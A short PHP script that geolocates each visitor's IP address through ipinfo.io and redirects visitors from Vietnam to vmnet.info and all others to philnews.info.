<?php

function ipDetails($ip)
{
    $json = file_get_contents("http://ipinfo.io/{$ip}");
    $details = json_decode($json);
    return $details;
}

$details = ipDetails($_SERVER['REMOTE_ADDR']);

if ($details->country == 'VN') {
    header('Location: http://vmnet.info', true, 301);
} else {
    header('Location: http://philnews.info', true, 301);
}
